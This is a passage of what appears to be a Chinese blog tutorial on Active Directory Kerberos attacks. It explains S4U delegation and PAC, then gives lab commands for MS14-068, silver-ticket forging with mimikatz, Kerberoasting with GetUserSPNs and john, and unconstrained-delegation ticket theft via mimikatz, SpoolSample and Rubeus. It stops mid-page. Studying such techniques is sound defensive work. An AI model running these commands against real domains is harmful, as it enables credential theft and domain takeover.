+<h3 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h3><p>​    S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。<strong>这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的</strong></p>
+<p>​    s4u2self的过程如下s4u2self的过程如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-031229.png"
+                      alt="image-20230425111229344"
+                ></p>
+<p>​    前提条件是服务已经有通过KDC验证的TGT，如下图，需要有TGT。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-031355.png"
+                      alt="image-20230425111355039"
+                ></p>
+<p>​    </p>
+<p>​    在步骤1中, 服务(<code>JACKSON-PC$</code>)使用S4U2self扩展名代表用户(<code>administrator</code>)获得针对服务本身(<code>JACKSON-PC$</code>)的服务票证。该服务将填写 PA_FOR_USER 数据结构,类型为<code>S4U2SELF</code>，并将KRB_TGS_REQ消息发送到TGS。 如下图，由于服务<code>JACKSON-PC$</code>代表用户向服务本身(也是<code>JACKSON-PC$</code>)发起请求，因此这里面cname是<code>JACKSON-PC$</code>,sname也是<code>JACKSON-PC$</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-031814.png"
+                      alt="image-20230425111814600"
+                ></p>
+<p>​    假定TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。如果服务请求了可转发选项，并且TGS的本地策略允许，则TGS检验通过后必须将<strong>票证标志</strong> 字段设置为可转发，既只要满足：</p>
+<p>​    1）TGT是可以转发的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033015.png"
+                      alt="image-20230425113015078"
+                ></p>
+<p>​    2）服务配置了约束委派</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033105.png"
+                      alt="image-20230425113105376"
+                ></p>
+<p>3）服务请求了可转发选项</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033210.png"
+                      alt="img"
+                ></p>
+<p>​    则TGS必须将<strong>票证标志</strong> 字段设置为可转发</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033314.png"
+                      alt="img"
+                ></p>
+<p>​    需要注意的是，如果用户的UserAccountControl字段中设置了USER_NOT_DELEGATED位,那么返回的TGS是永远也没法转发的。如图，当Administrator配置了敏感账户，不能被委派，返回的TGS的flag字段没有forwardable。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033656.png"
+                      alt="image-20230425113656664"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033707.png"
+                      alt="img"
+                ></p>
+<h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><p>​    s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。</p>
+<p>​    s4u2proxy的过程如下图所示:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034000.png"
+                      alt="img"
+                ></p>
+<p>​    在步骤1中，服务1试图代表用户获取服务2的服务票证。服务1发送KRB_TGS_REQ消息，并将用户的服务1服务票证作为 请求中的AddtionTicket。只要满足以下条件：</p>
+<p>1）拥有来自用户的授权( 在S4U2SELF阶段获得的TGS票据)，放在AddtionTicket里面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034727.png"
+                      alt="img"
+                ></p>
+<p>2）在请求的kdc-options中设置了CNAME-IN-ADDL-TKT标志。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034929.png"
+                      alt="img"
+                ></p>
+<p>3）服务请求了可转发选项</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034956.png"
+                      alt="img"
+                ></p>
+<p>4）服务1 有到服务2的约束委派，将服务2的SPN放在sname里面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-054520.png"
+                      alt="img"
+                ></p>
+<p>如果满足这些条件，则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票证。可转发标志将在服务票证中设置。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-054545.png"
+                      alt="img"
+                ></p>
+<p>​    有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的，下面分情况具体说下。</p>
+<p>1）AddtionTicket里面的票据是可转发的</p>
+<p>如果AddtionTicket里面的票据是可转发的，只要KDC Options里面置forwarable位，那么返回的票据必须置为可转发的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-062825.png"
+                      alt="img"
+                ></p>
+<p>2）AddtionTicket里面的票据是不可转发的</p>
+<p>如果AddtionTicket中的服务票据未设置为可转发的，则KDC必须返回状态为STATUS_NO_MATCH的KRB-ERR-BADOPTION选项。除了一种情况之外，就是配置了服务1到服务2 的基于资源的约束委派，且PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位(这一例外的前提是S4U2SELF阶段模拟的用户没被设置为对委派敏感，对委派敏感的判断在S4U2SELF阶段，而不是S4U2PROXY阶段)。</p>
+<p>AddtionTicket里面的票据是不可转发的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063045.png"
+                      alt="img"
+                ></p>
+<p>配置了服务1到服务2 的基于资源的约束委派</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063103.png"
+                      alt="img"
+                ></p>
+<p>PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063113.png"
+                      alt="img"
+                ></p>
+<p>返回的TGS票据是可转发的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063127.png"
+                      alt="img"
+                ></p>
+<h3 id="PAC介绍"><a href="#PAC介绍" class="headerlink" title="PAC介绍"></a>PAC介绍</h3><p>​    网上很多版本的kerberos的流程是</p>
+<ol>
+<li><p>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</p>
+</li>
+<li><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</p>
+</li>
+<li><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</p>
+</li>
+</ol>
+<p>​    上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p>
+<p>​    为了解决上面的这个问题，微软引进了PAC，引进PAC之后的kerberos流程变成</p>
+<ol>
+<li>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<strong>TGT里面包含PAC,PAC包含用户的sid，用户所在的组</strong>。</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-064957.png"
+                      alt="img"
+                ></p>
+<ol start="2">
+<li><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(<strong>这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据。</strong></p>
+</li>
+<li><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，<strong>就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）</strong>就允许用户访问。</p>
+</li>
+</ol>
+<p>​    <strong>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</strong></p>
+<h3 id="PAC安全问题MS14-068"><a href="#PAC安全问题MS14-068" class="headerlink" title="PAC安全问题MS14-068"></a>PAC安全问题MS14-068</h3><ol>
+<li>在KDC机构对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。</li>
+<li>PAC没有被放在TGT中，而是放在了TGS_REQ数据包的其它地方。但可笑的是，KDC在实现上竟然允许这样的构造，也就是说，KDC能够正确解析出没有放在其它地方的PAC信息。</li>
+<li>只要TGS_REQ按照刚才漏洞要求设置，KDC服务器会做出令人吃惊的事情：它不仅会从Authenticator中取出来subkey把PAC信息解密并利用客户端设定的签名算法验证签名，同时将另外的TGT进行解密得到SessionKeya-kdc；</li>
+<li>在验证成功后，把解密的PAC信息的尾部，重新采用自身Server_key和KDC_key生成一个带Key的签名，把SessionKeya-kdc用subkey加密，从而组合成了一个新的TGT返回给Client-A</li>
+</ol>
+<h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><ol>
+<li><h5 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h5></li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075835.png"
+                      alt="img"
+                ></p>
+<ol start="2">
+<li><h5 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h5></li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075824.png"
+                      alt="img"
+                ></p>
+<h5 id="3-pykek"><a href="#3-pykek" class="headerlink" title="3. pykek"></a>3. pykek</h5><p>全称是<code>Python Kerberos Exploitation Kit</code></p>
+<p>应该是ms14068漏洞利用，使用的最广泛的一个，一般常用的ms14068.exe，就是由他打包而成的</p>
+<p>先获取sid</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075917.png"
+                      alt="img"
+                ></p>
+<p>拼接成<code>S-1-5-21-866784659-4049716574-3063611777-1104</code></p>
+<p>生成tgt</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075916.png"
+                      alt="img"
+                ></p>
+<p>验证tgt是否具备域管权限</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-075919.png"
+                      alt="img"
+                ></p>
+<h3 id="TGS-REQ-amp-TGS-REP引出的问题"><a href="#TGS-REQ-amp-TGS-REP引出的问题" class="headerlink" title="TGS_REQ &amp; TGS_REP引出的问题"></a>TGS_REQ &amp; TGS_REP引出的问题</h3><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>​    在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p>
+<p>​    此处使用dc的cifs服务做演示。首先需要获得如下信息：</p>
+<ol>
+<li>/domain</li>
+<li>/sid</li>
+<li>/target:目标服务器的域名全称，此处为域控的全称</li>
+<li>/service：目标服务器上面的kerberos服务，此处为cifs</li>
+<li>/rc4：计算机账户的NTLM hash，域控主机的计算机账户</li>
+<li>/user：要伪造的用户名，此处可用silver测试</li>
+</ol>
+<p><code>sekurlsa::logonpasswords</code>导出服务DC$账户的ntlm hash</p>
+<p>[<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-081221.jpg"
+                      alt="3.png"
+                ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /target:dc.test.local /service:cifs /rc4:9150e40e4ec936a15baf384ca382a3df /user:dc$ /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-081441.jpg"
+                      alt="4.png"
+                ></p>
+<h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><p>​    在之前Kerberos的TGS_REQ &amp; TGS_REP过程中提到，只要用户提供的票据正确，服务就会返回自身hash加密的tgs票据，那么如果我们有一个域用户，就可以申请服务的tgs票据，本地爆破服务hash得到服务密码，这个过程叫做Kerberoasting。而在域中，服务通过spn来作为唯一标识。</p>
+<h5 id="SPN简介"><a href="#SPN简介" class="headerlink" title="SPN简介"></a>SPN简介</h5><p>​    SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
+<p>​    SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
+<p>​    当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下</p>
+<p>​    当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
+<h5 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
+<li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
+<li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
+</ol>
+<p>通过 <code>setspn -A MSSQLSvc/DM.test.local:1433 sqladmin</code> 注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-082851.png"
+                      alt="image-20230425162850624"
+                ></p>
+<h5 id="SPN查询"><a href="#SPN查询" class="headerlink" title="SPN查询"></a>SPN查询</h5><p>​    spn查询实际上是通过ldap协议查询的，那么当前用户必须是域用户或者是机器账户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br><span class="line">setspn -T test.local -q */*</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083122.png"
+                      alt="image-20230425163121403"
+                ></p>
+<p>CN=Users的是域账户注册的SPN，CN=Computers是机器账户。</p>
+<p>​    域内的任意主机都可以查询SPN，任何一个域用户都可以申请TGS票据。而我们爆破的话应该选择域用户进行爆破，因为机器用户的口令无法远程链接。</p>
+<p>那么Kerberoasting思路如下：</p>
+<ol>
+<li>查询SPN寻找在Users下并且是高权限域用户的服务</li>
+<li>请求并导出TGS</li>
+<li>爆破</li>
+</ol>
+<h5 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h5><p>基本上将服务器上运行的服务映射到它正在运行的帐户，以便它可以执行/接受 kerberos 身份验证。通常，这些服务，如“CIFS”（Windows 共享）在计算机帐户的上下文中运行。</p>
+<p>列出SPN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083543.png"
+                      alt="img"
+                ></p>
+<p>它还给了我一张票，我可以尝试暴力解密以获取用户的密码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083546.png"
+                      alt="img"
+                ></p>
+<p>john破解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john GetUserSPNs.out --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-083547.png"
+                      alt="img"
+                ></p>
+<h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><p>将我的权限给服务账户</p>
+<h4 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h4><p>​    一句话概况，委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。<strong>将我的权限给服务账户</strong>。</p>
+<p>​    需要注意的一点是接受委派的用户只能是服务账户或者机器账户</p>
+<ol>
+<li>机器账户:活动目录中的computers组内的计算机，也被称为机器账号。</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-084427.png"
+                      alt="image-20230425164426236"
+                ></p>
+<ol start="2">
+<li>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</li>
+</ol>
+<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
+<p>一个经典的例子如图</p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/Kerberos-Unconstrained-Delegation/1.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-084150.jpg"
+                      alt="1.png"
+                ></a></p>
+<p>jack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：</p>
+<ol>
+<li>jack以Kerberos协议认证登录，将凭证发送给websvc</li>
+<li>websvc使用jack的凭证向KDC发起Kerberos申请TGT。</li>
+<li>KDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。</li>
+<li>websvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。</li>
+<li>KDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。</li>
+<li>websvc使用jack的服务TGS票据请求后台文件服务器。</li>
+</ol>
+<p>一个微软的官方流程图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-090253.png"
+                      alt="image-20230425170252670"
+                ></p>
+<p>具体说明：</p>
+<p>WIN2016 域控 hostname：DC ip：10.150.127.166</p>
+<p>win2016 域机器 hostname：WEB ip：10.150.127.168</p>
+<p>域用户 many asd123!</p>
+<h5 id="设置非约束性委派"><a href="#设置非约束性委派" class="headerlink" title="设置非约束性委派"></a>设置非约束性委派</h5><h6 id="机器账户的非约束性委派设置"><a href="#机器账户的非约束性委派设置" class="headerlink" title="机器账户的非约束性委派设置"></a>机器账户的非约束性委派设置</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-091117.png"
+                      alt="image-20230425171117546"
+                ></p>
+<h6 id="服务账户的非约束委派设置"><a href="#服务账户的非约束委派设置" class="headerlink" title="服务账户的非约束委派设置"></a>服务账户的非约束委派设置</h6><p>many是普通域用户 默认是没有委派设置的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-092108.png"
+                      alt="image-20230425172107303"
+                ></p>
+<p>给域用户注册SPN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test many</span><br></pre></td></tr></table></figure>
+
+<p>在域控上执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-092220.png"
+                      alt="image-20230425172219977"
+                ></p>
+<p>然后查看many用户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-093920.png"
+                      alt="image-20230425173920266"
+                ></p>
+<p>已经有了委派属性然后设置为非约束委派</p>
+<h6 id="查询域内设置了非约束委派的服务账户"><a href="#查询域内设置了非约束委派的服务账户" class="headerlink" title="查询域内设置了非约束委派的服务账户"></a>查询域内设置了非约束委派的服务账户</h6><p>在WEB上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-094703.png"
+                      alt="image-20230425174701359"
+                ></p>
+<h6 id="查询域内设置了非约束委派的机器账户"><a href="#查询域内设置了非约束委派的机器账户" class="headerlink" title="查询域内设置了非约束委派的机器账户"></a>查询域内设置了非约束委派的机器账户</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-094924.png"
+                      alt="image-20230425174923466"
+                ></p>
+<p><strong>域内域控机器账户默认设置了非约束委派</strong></p>
+<p>adfind和ldapsearch都可以查询。</p>
+<h4 id="非约束委派利用方式1"><a href="#非约束委派利用方式1" class="headerlink" title="非约束委派利用方式1"></a>非约束委派利用方式1</h4><p>环境：WEB可委派，DC是域控。</p>
+<p>先查看WEB上的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101700.png"
+                      alt="image-20230425181659489"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101740.png"
+                      alt="image-20230425181740021"
+                ></p>
+<p>在DC上通过WinRM访问Web</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-100822.png"
+                      alt="image-20230425180822074"
+                ></p>
+<p>此时DM上已经缓存了从DC登录过来的域管的ticket，mimikatz导出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101806.png"
+                      alt="image-20230425181804566"
+                ></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-100939.png"
+                      alt="image-20230425180938440"
+                ></p>
+<p>再次访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101911.png"
+                      alt="image-20230425181910605"
+                ></p>
+<p>清除缓存</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101942.png"
+                      alt="image-20230425181942282"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-101957.png"
+                      alt="image-20230425181955658"
+                ></p>
+<h4 id="非约束委派利用方式2（Spooler打印机服务）"><a href="#非约束委派利用方式2（Spooler打印机服务）" class="headerlink" title="非约束委派利用方式2（Spooler打印机服务）"></a>非约束委派利用方式2（Spooler打印机服务）</h4><p>​    利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</p>
+<p>工具：<a class="link"   target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample" >https://github.com/leechristensen/SpoolSample<i class="fas fa-external-link-alt"></i></a></p>
+<p>​    需要以域用户运行SpoolSample，需要开启Print Spooler服务，该服务默认自启动。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-164517.png"
+                      alt="image-20230426004516253"
+                ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC DM</span><br></pre></td></tr></table></figure>
+
+<p>使DC强制访问DM认证，同时使用rubeus监听来自DC的4624登录日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:dc$</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
